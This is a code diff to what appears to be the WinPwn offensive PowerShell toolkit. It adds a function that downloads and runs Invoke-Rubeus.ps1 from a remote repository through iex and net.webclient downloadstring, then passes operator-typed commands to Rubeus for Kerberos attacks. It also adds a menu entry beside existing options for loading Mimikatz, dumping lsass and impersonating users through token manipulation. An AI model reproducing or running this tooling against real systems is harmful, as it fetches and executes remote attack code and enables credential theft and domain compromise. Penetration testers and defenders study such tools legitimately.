@@ -302,6 +302,13 @@ __        ___       ____
     }
 }
 
+function customRubeus
+{
+    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
+    $customCommand = Read-Host -Prompt "Please enter the command you want to execute:"
+    Invoke-Rubeus -Command "$customCommand" 
+}
+
 function isadmin
 {
     # Check if Elevated
@@ -4970,7 +4977,8 @@ __        ___       ____
 	Write-Host -ForegroundColor Green '16. Reflectively load Mimik@tz into memory!'
 	Write-Host -ForegroundColor Green '17. Dump lsass via various techniques!'
     Write-Host -ForegroundColor Green '18. Impersonate other Users on this system via Token Manipulation!'
-        Write-Host -ForegroundColor Green '19. Exit. '
+    Write-Host -ForegroundColor Green '19. Execute custom Rubeus commands!'
+        Write-Host -ForegroundColor Green '20. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -4994,9 +5002,10 @@ __        ___       ____
 			16{mimiload}
 			17{lsassdumps}
             18{TokenManipulation}
+            19{CustomRubeus}
     }
     }
-  While ($masterquestion -ne 19)
+  While ($masterquestion -ne 20)
      
    
 }
